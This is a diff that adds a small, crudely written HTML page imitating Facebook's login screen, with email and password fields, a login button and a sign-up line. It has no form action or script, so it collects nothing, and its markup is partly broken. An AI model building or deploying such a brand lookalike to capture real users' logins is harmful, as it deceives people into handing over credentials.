@@ -1,0 +1,20 @@
+<html>
+<head>
+<title>facebook login page</title>
+</head>
+<body bgcolor="3b5998">
+<br><br><br><br>
+<font color="white">
+<center><b><face="segoe ui" size="30">facebook</font></b></center>
+ <br><br><br>
+ <center>
+ <input type="text" name="Email" value="Email or phone" size="40" style="height:30px;">
+<br><br>
+  <input type="text" name="Password" value="Password" size="40" style="height:30px;">
+   <br><br><br><br>
+   <input type="submit" value="log In" style="background-color:4862A3; width:315px hight:60px; color:white">
+    <br><br><br><br> <br><br><br><br> <br><br><br><br>
+	<u>Sign up for facebook</u>
+  </center>
+</body>
+</html>
